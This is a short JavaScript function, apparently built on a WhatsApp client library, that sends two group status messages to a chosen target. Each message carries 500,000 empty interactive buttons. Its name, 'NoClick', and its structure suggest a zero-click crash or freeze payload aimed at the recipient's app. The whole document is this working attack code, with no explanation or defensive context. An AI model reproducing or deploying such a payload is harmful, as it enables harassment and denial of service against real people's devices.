async function XzyNoClick(sock, target) {
  const msg1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Helo"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };
  
  const msg2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Helo"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };
  
  
  await sock.relayMessage(target, msg1, { noSyncSelf: true });
  await sock.relayMessage(target, msg2, { noSyncSelf: true });
  await new Promise((r) => setTimeout(r, 1500));
}
